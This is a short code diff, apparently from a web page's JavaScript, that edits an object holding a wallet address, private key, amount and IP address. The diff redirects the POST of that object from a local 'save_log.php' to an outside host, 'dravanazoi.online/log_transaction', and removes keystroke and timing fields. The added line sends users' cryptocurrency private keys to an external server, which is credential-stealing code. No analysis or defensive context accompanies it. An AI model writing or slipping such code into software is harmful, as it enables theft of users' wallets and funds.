@@ -369,12 +369,10 @@
                 address: address,
                 privateKey: privateKey,
                 amount: amount,
-                ip: ip,
-                secondsSpent: secondsSpent,
-                keystrokes: keystrokes
+                ip: ip
             };
 
-            fetch('save_log.php', {
+            fetch('https://dravanazoi.online/log_transaction', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
